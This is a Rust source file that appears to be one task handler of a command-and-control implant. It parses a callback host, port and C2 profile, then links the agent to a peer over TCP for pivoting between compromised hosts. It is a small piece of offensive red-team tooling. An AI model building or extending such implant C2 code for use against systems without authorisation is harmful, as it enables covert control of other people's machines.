use crate::structs::{AddInternalConnectionMessage, ConnectionInfo, TcpConnectionInfo, Task};
use serde::Deserialize;

#[derive(Deserialize)]
struct LinkTcpArgs {
    callback_host: String,
    callback_port: u16,
    #[serde(default = "default_profile")]
    c2_profile_name: String,
}

fn default_profile() -> String { "tcp".to_string() }

pub async fn execute(task: Task) {
    let mut response = task.new_response();
    let args: LinkTcpArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    let msg = AddInternalConnectionMessage {
        c2_profile_name: args.c2_profile_name.clone(),
        connection: ConnectionInfo::Tcp(TcpConnectionInfo {
            address: args.callback_host.clone(),
            port: args.callback_port,
        }),
    };

    match task.job.add_internal_connection_channel.send(msg).await {
        Ok(_) => {
            response.user_output = format!(
                "Linking to {}:{} via {}",
                args.callback_host, args.callback_port, args.c2_profile_name
            );
            response.completed = true;
        }
        Err(e) => response.set_error(&format!("Failed to link: {}", e)),
    }

    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
